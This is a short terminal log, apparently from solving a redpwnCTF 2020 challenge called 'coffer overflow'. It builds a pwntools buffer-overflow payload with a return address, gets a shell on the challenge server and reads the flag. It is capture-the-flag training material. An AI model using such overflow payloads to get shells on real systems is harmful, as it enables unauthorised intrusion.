```
kali@kali:~$ python
Python 2.7.17 (default, Jan 19 2020, 19:54:54) 
[GCC 9.2.1 20200110] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> conn = remote('2020.redpwnc.tf',31908)
[x] Opening connection to 2020.redpwnc.tf on port 31908
[x] Opening connection to 2020.redpwnc.tf on port 31908: Trying 35.231.164.133
[+] Opening connection to 2020.redpwnc.tf on port 31908: Done
>>> conn.recv()
'Welcome to coffer overflow, where our coffers are overfilling with bytes ;)\nWhat do you want to fill your coffer with?\n'
>>> payload = "A"*24
>>> payload += p64(0x4006e6)
>>> payload
'AAAAAAAAAAAAAAAAAAAAAAAA\xe6\x06@\x00\x00\x00\x00\x00'
>>> conn.send(payload)
>>> conn.interactive()
[*] Switching to interactive mode
ls
cat flag.txt
flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}
whoami
/bin/sh: 2: whoami: not found
pwd
/
^C[*] Interrupted
>>> 

```